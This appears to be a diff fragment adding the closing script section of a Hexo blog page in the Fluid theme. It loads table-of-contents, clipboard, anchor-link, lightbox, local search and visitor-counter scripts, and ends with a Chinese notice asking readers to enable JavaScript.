+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
